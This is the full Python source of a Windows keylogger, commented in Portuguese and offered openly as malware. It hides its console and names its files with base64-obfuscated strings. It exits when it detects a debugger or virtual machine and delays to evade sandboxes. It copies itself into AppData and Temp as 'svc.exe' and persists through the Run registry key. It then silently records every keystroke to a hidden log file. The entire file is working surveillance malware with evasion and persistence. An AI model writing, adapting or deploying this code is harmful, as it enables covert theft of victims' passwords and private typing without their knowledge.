import os
import sys
import shutil
import winreg
import threading
import base64
import random
import time
import ctypes
import psutil
from pynput import keyboard
from datetime import datetime

# === STRINGS FORTEMENTE OFUSCADAS ===
DATA = {
    "folder": base64.b64decode(b'V2luU3lz').decode(),  # WinSys
    "filename": base64.b64decode(b'c3ZjLmV4ZQ==').decode(),  # svc.exe
    "regname": base64.b64decode(b'U3lzdGVtU2VydmljZXM=').decode(),  # SystemServices
    "logfile": base64.b64decode(b'ZGF0YXRyYWNrLmRhdA==').decode()  # datatrack.dat
}

# === CONFIG ===
APPDATA_PATH = os.getenv('APPDATA')
HIDDEN_DIR = os.path.join(APPDATA_PATH, DATA['folder'])
NEW_EXEC_PATH = os.path.join(HIDDEN_DIR, DATA['filename'])
LOG_PATH = os.path.join(HIDDEN_DIR, DATA['logfile'])
PERSIST_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"

# === UTILITÁRIOS ===
def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def random_sleep():
    """Delay aleatório para dificultar análise sandbox."""
    time.sleep(random.randint(30, 120))

def is_debugging():
    """Detecta se está sendo debugado."""
    is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
    if is_debugger_present:
        sys.exit()

def is_virtual_machine():
    """Detecta ambiente de máquina virtual simples."""
    suspicious = ['vbox', 'vmware', 'virtual', 'xen', 'qemu']
    for proc in psutil.process_iter(['name']):
        try:
            if any(s in proc.info['name'].lower() for s in suspicious):
                sys.exit()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

def replicate_self():
    """Copia-se para pasta oculta e para pasta Temp."""
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
    temp_path = os.getenv('TEMP')

    targets = [
        os.path.join(HIDDEN_DIR, DATA['filename']),
        os.path.join(temp_path, DATA['filename']),
    ]

    for target in targets:
        if not os.path.exists(target):
            shutil.copy2(sys.executable, target)

def add_to_startup():
    """Adiciona cópia ao registro para persistência."""
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, DATA['regname'], 0, winreg.REG_SZ, NEW_EXEC_PATH)
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def start_keylogger():
    """Captura silenciosa das teclas."""
    def on_press(key):
        try:
            with open(LOG_PATH, 'a', encoding='utf-8') as log:
                log.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            with open(LOG_PATH, 'a', encoding='utf-8') as log:
                log.write(f"{datetime.now()} - {key}\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def main():
    hide_console()
    is_debugging()
    is_virtual_machine()
    random_sleep()
    replicate_self()
    add_to_startup()

    # Executar keylogger em uma thread para disfarçar
    threading.Thread(target=start_keylogger, daemon=True).start()

    # Thread principal "morta" (engana antivírus/sandbox)
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
